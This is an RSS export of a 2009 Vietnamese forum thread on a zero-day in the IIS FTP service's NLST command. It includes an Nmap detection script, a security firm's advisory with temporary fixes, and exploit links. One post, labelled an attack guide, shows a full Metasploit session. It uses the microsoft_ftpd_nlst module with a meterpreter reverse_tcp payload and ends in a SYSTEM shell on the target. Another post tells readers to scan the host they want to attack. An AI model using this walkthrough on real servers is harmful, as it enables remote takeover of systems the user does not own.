<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "Microsoft Internet Information Server ftpd zeroday"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
		<description><![CDATA[Latest messages posted in the topic "Microsoft Internet Information Server ftpd zeroday"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>Microsoft Internet Information Server ftpd zeroday</title>
				<description><![CDATA[ <font color='orange'>A new 0-day exploit for the FTP server included within the Microsoft IIS suite has been released today. Check the post on the Full Disclosure mailing list for more details.

Based on an existing Nmap script, I quickly wrote a new one which performs the following actions:

    * Check if anonymous sessions are allowed.
    * Check if the detected FTP server is running Microsoft ftpd.
    * Check if the MKDIR command is allowed (this seems to be required by the exploit)

If all those conditions are met, the script exits with a warning message. Note that my script will only report servers which could be vulnerable. On the other side, running a server with anonymous users able to create directories is a major security breach and must be fixed independently of the newly discovered vulnerability!</font>

script:

<span class="link"> http://blog.rootshell.be/wp-content/uploads/2009/08/IIS-FTP.nse</span>

copy đoạn script vào /usr/local/share/nmap/scripts/ sau đó rebuild your scripts index

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre># nmap --script-updatedb</pre>
		</div>

khai thác:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre># Nmap-p 21-sV - script = IIS-FTP 10.0.0.7 

Starting Nmap 4.76 &#40;<span class="link"> http://nmap.org</span> &#41; at 2009-09-01 01:15 CEST
Interesting ports on test-win &#40;10.0.0.7&#41;:
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
|_ IIS FTP: IIS Server allow anonymous and mkdir &#40;potentially vulnerable&#41;
Service Info: OS: Windows</pre>
		</div>

<span class="link"> http://seclists.org/fulldisclosure/2009/Aug/0443.html</span>


]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31061.hva#191688</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/31061.hva#191688</link>
				<pubDate><![CDATA[Tue, 1 Sep 2009 02:11:20]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>Microsoft Internet Information Server ftpd zeroday</title>
				<description><![CDATA[ <font color='orange'>1. Thông tin chung

Ngày 01/09/2008, lỗ hổng zero-day trong dịch vụ FTP của phần mềm IIS đã được công bố cùng với mã khai thác. Đây là lỗ hổng nghiêm trọng cho phép hacker dễ dàng tấn công và kiếm soát máy chủ IIS từ xa. Đây là một lỗ hổng nghiêm trọng, có thể ảnh hướng tới nhiều hệ thống máy chủ Web tại Việt Nam, vì phần lớn máy chủ cài IIS đều có cài thêm dịch vụ FTP của Microsoft.

2. Mô tả kỹ thuật

IIS (hay Internet Information Server) là phần mềm cung cấp các dịch vụ máy chủ Internet của Microsoft như HTTP, FTP, SMTP… Lỗ hổng zero-day được phát hiện nằm trong quá trình xử lý giao thức FTP của IIS.

Cụ thể, giao thức FTP hỗ trợ một câu lệnh như sau: NLST [remote-directory]. Câu lệnh trên cho phép FTP client liệt kê các file có trong thư mục [re mote-directory] trên máy chủ.

Dịch vụ FTP của IIS cũng hỗ trợ câu lệnh này, tuy nhiên với một đường dẫn [remote-directory] đặc biệt và dài “quá khổ”, IIS đã xử lý không tốt dẫn đến lỗi tràn bộ đệm cho phép chuyển điều khiển đến mã độc.

Lợi dụng lỗ hổng này, hacker có thể dễ dàng tấn công các máy chủ IIS có hỗ trợ FTP bằng cách thực hiện kết nối, đăng nhập và gửi lệnh NLST chứa mã độc nhằm kiểm soát toàn bộ máy chủ IIS. Lỗ hổng này sẽ đặc biệt nghiêm trọng nếu IIS cho phép các kết nối mà không cần quyền xác thực (anonymous).


3. Cập nhật bản vá

Đánh giá đây là lỗ hổng đặc biệt nghiêm trọng và việc Microsoft chưa thể đưa ra bản vá, Bkis khuyến cáo các quản trị mạng của các đơn vị, các cá nhân nên ngừng sử dụng chức năng FTP của IIS cho đến khi có bản vá chính thức.</font>
 

Bkis Security

<span class="link"> http://www.quantrimang.com.vn/baomat/bao-mat/tin-bao-mat/59821_Microsoft_IIS_Server_bi_tan_cong.aspx</span>

<span class="link"> http://bkav.com.vn/tinh_hinh_an_ninh_mang/01/09/2009/6/2435/</span>

<span class="link"> http://milw0rm.com/exploits/9541</span>

fix lỗi tạm thời:
<font color='orange'>
* Tắt các dịch vụ FTP nếu bạn không cần nó
* Ngăn chặn việc tạo các thư mục mới bằng cách sử dụng NTFS ACL
* Ngăn chặn người dùng vô danh thông qua các thiết lập IIS </font>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31061.hva#191747</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/31061.hva#191747</link>
				<pubDate><![CDATA[Tue, 1 Sep 2009 22:08:22]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>Microsoft Internet Information Server ftpd zeroday</title>
				<description><![CDATA[ hướng dẫn tấn công bằng metasploit:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>=&#91; msf v3.3-dev
+ -- --=&#91; 403 exploits - 273 payloads
+ -- --=&#91; 21 encoders - 8 nops
       =&#91; 193 aux

msf &gt; use exploit/windows/ftp/microsoft_ftpd_nlst 
msf exploit&#40;microsoft_ftpd_nlst&#41; &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/meterpreter/reverse_tcp
msf exploit&#40;microsoft_ftpd_nlst&#41; &gt; set LHOST 192.168.0.136 
LHOST =&gt; 192.168.0.136
msf exploit&#40;microsoft_ftpd_nlst&#41; &gt; set RHOST 192.168.0.128
RHOST =&gt; 192.168.0.128
msf exploit&#40;microsoft_ftpd_nlst&#41; &gt; exploit 

&#91;*&#93; Handler binding to LHOST 0.0.0.0
&#91;*&#93; Started reverse handler
&#91;*&#93; Connecting to FTP server 192.168.0.128:21...
&#91;*&#93; Connected to target FTP server.
&#91;*&#93; Authenticating as anonymous with password mozilla@example.com...
&#91;*&#93; Sending password...
&#91;*&#93; 257 &quot;RTIXDYMRJB&quot; directory created.
&#91;*&#93; 250 CWD command successful.
&#91;*&#93; Creating long directory...
&#91;*&#93; 257 &quot;SQL�UURU5UUUU@�8QKORu�@@@@��GVSVIHLODRPRVJDPILGXHZNKLNIYQZKGXCWEAGFGHTXSXDBYDLLXKGKYWUJNJGTZX����ASNOHNZRTDAAMVPKVEQRAVWPUJNGYKWSAIUMUPWLBU������������w�����YYTPSDOYTB�f���ICVFVCFUIZKQTRMIEWETKWE&quot; directory created.
&#91;*&#93; 200 PORT command successful.
&#91;*&#93; Trying target Windows 2000 SP4 Universal &#40;IIS 5.0&#41;...
&#91;*&#93; 150 Opening ASCII mode data connection for file list.
&#91;*&#93; Sending stage &#40;718336 bytes&#41;
&#91;*&#93; Meterpreter session 1 opened &#40;192.168.0.136:4444 -&gt; 192.168.0.128:1076&#41;

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt;</pre>
		</div>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31061.hva#191750</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/31061.hva#191750</link>
				<pubDate><![CDATA[Tue, 1 Sep 2009 22:35:27]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>Microsoft Internet Information Server ftpd zeroday</title>
				<description><![CDATA[ các bạn có thể sử dụng đoạn Nmap script sau để phát hiện server bị lỗi FTP oday:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>--- Checks if a Microsoft FTP server allows anonymous logins + MKDIR
--- If yes, could be vulnerable to the following exploit:
---<span class="link"> http://seclists.org/fulldisclosure/2009/Aug/0443.html</span>
-- @output
-- |_ FTP: IIS Server allow anonymous and mkdir &#40;potentially vulnerable&#41;
--
-- @args ftpuser Alternate user to initiate the FTP session
--       ftppass Alternate password to initiate the FTP session
--       If no arguments are passed, anonymous FTP session is probed

id="IIS FTP"
description="Checks to see if a Microsoft ISS FTP server allows anonymous logins and MKDIR &#40;based on anonftp.nse by Eddie Bell &lt;ejlbell@gmail.com&gt;&#41;"
author = "Xavier Mertens &lt;xavier@rooshell.be&gt;"
license = "Same as Nmap--See<span class="link"> http://nmap.org/book/man-legal.html</span>"
categories = {"default", "auth", "intrusive"}

require "shortport"
local stdnse = require "stdnse"
---
-- portrule = shortport.port_or_service&#40;21, "ftp"&#41;
portrule = function&#40;host,port&#41;
	if &#40;port.number == 21 and
	    &#40;port.state == "open" or port.state == "open|filtered"&#41;&#41;
	then
		return true
	else
		return false
	end
end

---
-- Connects to the ftp server and checks if the server allows
-- anonymous logins or any credentials passed as arguments
action = function&#40;host, port&#41;
	local socket = nmap.new_socket&#40;&#41;
	local result
	local status = true
	local isAnon = false

	local err_catch = function&#40;&#41;
		socket:close&#40;&#41;
	end

	local try = nmap.new_try&#40;err_catch&#40;&#41;&#41;

	socket:set_timeout&#40;5000&#41;
	try&#40;socket:connect&#40;host.ip, port.number, port.protocol&#41;&#41;

	if &#40;type&#40;nmap.registry.args.ftpuser&#41; == "string" and nmap.registry.args.ftpuser ~= "" and
	    type&#40;nmap.registry.args.ftppass&#41; == "string" and nmap.registry.args.ftppass ~= ""&#41;
	then
		local struser = "USER " .. nmap.registry.args.ftpuser .. "\r\n"
		local strpass = "PASS " .. nmap.registry.args.ftppass .. "\r\n"
		try&#40;socket:send&#40;struser&#41;&#41;
		try&#40;socket:send&#40;strpass&#41;&#41;
	else
		try&#40;socket:send&#40;"USER anonymous\r\n"&#41;&#41;
		try&#40;socket:send&#40;"PASS IEUser@\r\n"&#41;&#41;
	end

        while status do
		status, result = socket:receive_lines&#40;1&#41;;
		if string.match&#40;result, "^230"&#41; then
			try&#40;socket:send&#40;"RSTATUS\r\n"&#41;&#41;
			while status do
				status, result = socket:receive_lines&#40;1&#41;;
				if string.match&#40;result, "^211-Microsoft FTP Service"&#41; then
					try&#40;socket:send&#40;"MKD w00t\r\n"&#41;&#41;
					while status do
						status, result = socket:receive_lines&#40;1&#41;;
						if string.match&#40;result, "^257"&#41; then
							isVuln=true
							try&#40;socket:send&#40;"RMDIR w00t\r\n"&#41;&#41;
							break;
						end
					end
				end
			end
		end
	end

	socket:close&#40;&#41;

	if&#40;isVuln&#41; then
		return "IIS Server allow anonymous and mkdir &#40;potentially vulnerable&#41;"
	end
end</pre>
		</div>


<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre># nmap -p 21 -sV --script=IIS-FTP --scriptargs=ftpuser=foo,ftppass=bar 10.0.0.7</pre>
		</div>
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31061.hva#191816</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/31061.hva#191816</link>
				<pubDate><![CDATA[Wed, 2 Sep 2009 23:18:35]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>Microsoft Internet Information Server ftpd zeroday</title>
				<description><![CDATA[ <span class="link"> http://archives.free.net.ph/message/20090903.215352.6e5d3f0a.en.html</span> &lt;--- new bug :) ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31061.hva#191941</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/31061.hva#191941</link>
				<pubDate><![CDATA[Fri, 4 Sep 2009 02:02:55]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>Microsoft Internet Information Server ftpd zeroday</title>
				<description><![CDATA[ ở trên có đoạn code sử dụng nmap để tìm lỗi 0-day FTP,các bạn save đoạn code lại thành file.nse,lưu ở /usr/local/share/nmap/scripts/ ,sau đó sử dụng câu lệnh này để cập nhật db cho nmap:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>nmap --script-updatedb</pre>
		</div>


<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>r00t@holiganvn

tarting Nmap 5.00 &#40;<span class="link"> http://nmap.org</span> &#41; at 2009-09-06 14:14 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using –system-dns or specify valid servers with –dns-servers
Interesting ports on 192.168.41.4:
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd
MAC Address: 08:00:27:B5:C1:E9 &#40;Cadmus Computer Systems&#41;
Service Info: OS: Windows

Service detection performed. Please report any incorrect results at<span class="link"> http://nmap.org/submit/</span> .
Nmap done: 1 IP address &#40;1 host up&#41; scanned in 5.53 seconds</pre>
		</div>

sử dụng nmap tìm lỗi ở cổng 21

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>nmap -p21 --script= -host muốn tấn công-</pre>
		</div>

video tấn công ,demo với back-track

<br>
			<div align="center" class="limitview"><img src='http://www.offensive-security.com/images/microsoft-iis-ftp-remote-exploit.png' border="0" onload="maxImg(this, 500px);" /></div>

<span class="link"> http://www.offensive-security.com/videos/microsoft-ftp-server-remote-exploit/msftp.html</span>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31061.hva#192270</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/31061.hva#192270</link>
				<pubDate><![CDATA[Thu, 10 Sep 2009 08:18:25]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
	</channel>
</rss>
